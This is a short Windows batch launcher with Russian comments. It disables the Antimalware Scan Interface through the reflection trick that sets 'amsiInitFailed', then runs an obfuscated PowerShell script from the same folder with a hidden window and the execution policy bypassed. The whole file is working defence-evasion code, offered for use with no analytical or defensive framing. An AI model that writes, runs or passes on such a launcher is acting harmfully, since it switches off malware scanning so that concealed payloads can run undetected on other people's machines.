@echo off
setlocal

:: Путь к твоему PowerShell скрипту
set scriptPath=.\Obfuscated-jnsdzyegc4c.ps1

:: Обход AMSI и скрытие окна консоли
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); & '%scriptPath%'}"

endlocal